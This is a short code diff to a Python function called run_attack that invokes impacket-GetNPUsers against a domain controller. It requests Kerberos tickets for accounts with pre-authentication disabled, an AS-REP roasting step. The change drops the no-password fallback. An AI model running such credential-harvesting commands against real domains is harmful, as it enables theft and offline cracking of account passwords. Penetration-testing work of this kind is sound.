@@ -41,12 +41,10 @@ def run_attack(target: str = None, domain: str = "domain.local", user: str = Non
         # Use GetNPUsers to find accounts with pre-auth disabled
         cmd = [
             "impacket-GetNPUsers",
-            f"{domain}/{user}:{password}" if user and password else domain,
+            f"{domain}/{user}:{password}",
             "-dc-ip", target,
-            "-request",  # Request TGT for vulnerable accounts
-            "-no-pass" if not password else "",
+            "-request",
         ]
-        cmd = [c for c in cmd if c]  # Remove empty strings
         
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
         
